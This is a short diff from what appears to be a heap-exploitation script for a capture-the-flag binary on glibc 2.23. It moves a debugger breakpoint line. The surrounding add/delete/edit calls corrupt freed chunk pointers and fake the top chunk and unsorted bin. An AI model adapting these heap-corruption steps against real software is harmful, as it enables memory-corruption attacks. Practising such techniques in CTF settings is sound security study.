@@ -42,9 +42,9 @@ unsort_bin = 0x6ca858
 add(0, "0")
 add(1, "1")
 delete(0)
-ddebug("b *0x400DAF  \n set glibc 2.23\n continue")
 edit(0, p64(0)+p64(p_chunk-0x10))
 add(2, b"tinyfat")
+ddebug("b *0x400DAF  \n set glibc 2.23\n continue")
 edit(0, p64(p_chunk)+p64(0)+p64(unsort_bin)*2) # 改topchunk+清空unsorted_bin
 
 add(0, p64(p_chunk))
